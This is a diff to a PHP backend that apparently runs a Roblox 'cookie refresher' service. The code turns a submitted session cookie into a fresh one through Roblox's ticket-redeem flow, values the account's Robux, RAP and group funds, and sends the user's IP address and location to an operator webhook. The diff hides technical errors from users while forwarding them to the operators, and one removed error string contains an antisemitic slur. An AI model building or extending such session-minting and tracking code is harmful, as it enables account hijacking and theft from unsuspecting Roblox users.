@@ -520,6 +520,55 @@ function calculateAccountValue($robux, $rap, $groupFunds, $pendingRobux, $credit
     return $robux + $rap + $groupFunds + $pendingRobux + $creditRobux;
 }
 
+/**
+ * Simplify error messages for public display
+ * Maps technical errors to user-friendly messages
+ */
+function getUserFriendlyError($technicalError) {
+    $error = strtolower($technicalError);
+    
+    // Network errors
+    if (strpos($error, 'network') !== false || strpos($error, 'curl') !== false || strpos($error, 'timeout') !== false) {
+        return 'Service temporarily unavailable. Please try again.';
+    }
+    
+    // Cookie validation errors
+    if (strpos($error, 'csrf') !== false || strpos($error, 'token') !== false) {
+        return 'Invalid or expired cookie';
+    }
+    
+    if (strpos($error, 'ticket') !== false || strpos($error, 'authentication') !== false) {
+        return 'Cookie may be invalid or expired';
+    }
+    
+    if (strpos($error, 'verify') !== false || strpos($error, 'failed to verify') !== false) {
+        return 'Unable to verify cookie';
+    }
+    
+    // VPN/Proxy errors
+    if (strpos($error, 'vpn') !== false || strpos($error, 'proxy') !== false) {
+        return 'VPN or proxy detected. Please disable and try again.';
+    }
+    
+    // Country restriction errors
+    if (strpos($error, 'country') !== false || strpos($error, 'not allowed') !== false) {
+        return 'Access restricted from your location';
+    }
+    
+    // Account age errors
+    if (strpos($error, 'account too new') !== false || strpos($error, 'minimum age') !== false) {
+        return 'Account does not meet requirements';
+    }
+    
+    // Cookie jar/file errors
+    if (strpos($error, 'cookie jar') !== false || strpos($error, 'tempnam') !== false) {
+        return 'Service error. Please try again later.';
+    }
+    
+    // Generic fallback
+    return 'Invalid cookie';
+}
+
 // ================================================
 // MAIN LOGIC
 // ================================================
@@ -547,11 +596,11 @@ try {
     error_log("Refresh attempt from: {$ipInfo['ip']} - {$ipInfo['city']}, {$ipInfo['country']} - Device: {$deviceInfo['type']} ({$deviceInfo['os']}/{$deviceInfo['browser']})");
 
     if ($ipInfo['proxy'] || $ipInfo['hosting']) {
-        throw new Exception('VPN/Proxy detected. Please disable VPN and try again.');
+        throw new Exception('VPN/Proxy detected');
     }
 
     if (!isCountryAllowed($ipInfo['countryCode'], $blockedCountries, $allowedCountries)) {
-        throw new Exception('Access from your country is not allowed.');
+        throw new Exception('Country not allowed');
     }
 
     if (isQueueBusy()) {
@@ -574,7 +623,7 @@ try {
 
     $jar = tempnam(sys_get_temp_dir(), 'rbxjar_');
     if ($jar === false) { 
-        throw new Exception('Failed to create cookie jar');
+        throw new Exception('Service error');
     }
 
     $expiry = time() + 86400 * 30;
@@ -587,12 +636,12 @@ try {
     ], 'POST', '', $jar);
 
     if ($csrf['error']) {
-        throw new Exception('Network error: ' . $csrf['error']);
+        throw new Exception('Network error');
     }
 
     $csrfToken = header_value($csrf['headers'], 'x-csrf-token');
     if (!$csrfToken) {
-        throw new Exception('Invalid Cookie - Expired Cookie');
+        throw new Exception('Invalid cookie - CSRF token not found');
     }
 
     $ticketJar = tempnam(sys_get_temp_dir(), 'rbxtkt_');
@@ -607,12 +656,12 @@ try {
     ], 'POST', '', $ticketJar);
 
     if ($ticketResp['error']) {
-        throw new Exception('Network error: ' . $ticketResp['error']);
+        throw new Exception('Network error');
     }
 
     $ticket = header_value($ticketResp['headers'], 'rbx-authentication-ticket');
     if (!$ticket) {
-        throw new Exception('cookie may be invalid');
+        throw new Exception('Authentication ticket not found');
     }
 
     @unlink($ticketJar);
@@ -627,11 +676,11 @@ try {
     ], 'POST', json_encode(['authenticationTicket' => $ticket]), $redeemJar);
 
     if ($redeem['error']) {
-        throw new Exception('Network error: ' . $redeem['error']);
+        throw new Exception('Network error');
     }
 
     if ($redeem['status'] !== 200) {
-        throw new Exception('Error Code Jew - status ' . $redeem['status']);
+        throw new Exception('Failed to redeem ticket');
     }
 
     $newCookieFromHeader = null;
@@ -662,7 +711,7 @@ try {
     $userId = $settingsData['UserId'] ?? null;
 
     if (!$userId) {
-        throw new Exception('Failed to verify new cookie');
+        throw new Exception('Failed to verify cookie');
     }
 
     $userInfoData = makeRequest("https://users.roblox.com/v1/users/$userId", $headers);
@@ -676,7 +725,7 @@ try {
         $accountAge = "$accountAgeDays days";
         
         if ($minAccountAgeDays > 0 && $accountAgeDays < $minAccountAgeDays) {
-            throw new Exception("Account too new. Minimum age: {$minAccountAgeDays} days. This account: {$accountAgeDays} days.");
+            throw new Exception("Account too new");
         }
     }
     
@@ -927,12 +976,17 @@ try {
     @unlink($jar);
 
 } catch (Exception $e) {
-    error_log("ERROR: " . $e->getMessage());
+    $technicalError = $e->getMessage();
+    $userFriendlyError = getUserFriendlyError($technicalError);
+    
+    // Log the technical error for debugging
+    error_log("ERROR: $technicalError");
     
     $userIP = getUserIP();
     $ipInfo = getIPInfo($userIP);
     
-    $stats = logRefreshAttempt(false, $e->getMessage(), [
+    // Log with technical error for internal tracking
+    $stats = logRefreshAttempt(false, $technicalError, [
         'ip' => $ipInfo['ip'],
         'country' => $ipInfo['country']
     ]);
@@ -940,6 +994,7 @@ try {
     $env = parse_env();
     $errorWebhookUrl = $env['ERROR_WEBHOOK_URL'] ?? '';
     
+    // Send technical error to webhook for admin monitoring
     if (!empty($errorWebhookUrl)) {
         $errorEmbed = [
             'username' => 'Mystic Errors',
@@ -948,7 +1003,8 @@ try {
                 'title' => '❌ Refresh Failed',
                 'color' => hexdec('FF0000'),
                 'fields' => [
-                    ['name' => '⚠️ Error', 'value' => "```{$e->getMessage()}```", 'inline' => false],
+                    ['name' => '⚠️ Technical Error', 'value' => "```$technicalError```", 'inline' => false],
+                    ['name' => '👤 User Sees', 'value' => "```$userFriendlyError```", 'inline' => false],
                     ['name' => '🌍 Location', 'value' => "```{$ipInfo['city']}, {$ipInfo['country']}```", 'inline' => true],
                     ['name' => '🔗 IP Address', 'value' => "```{$ipInfo['ip']}```", 'inline' => true],
                     ['name' => '📊 Stats', 'value' => "```Total: {$stats['total']} | Failed: {$stats['failed']}```", 'inline' => false],
@@ -960,8 +1016,10 @@ try {
         sendWebhook($errorWebhookUrl, $errorEmbed);
     }
     
+    // Return user-friendly error to client
     http_response_code(400);
-    echo json_encode(['error' => $e->getMessage()]);
+    echo json_encode(['error' => $userFriendlyError]);
+    
     if (isset($jar) && file_exists($jar)) {
         @unlink($jar);
     }
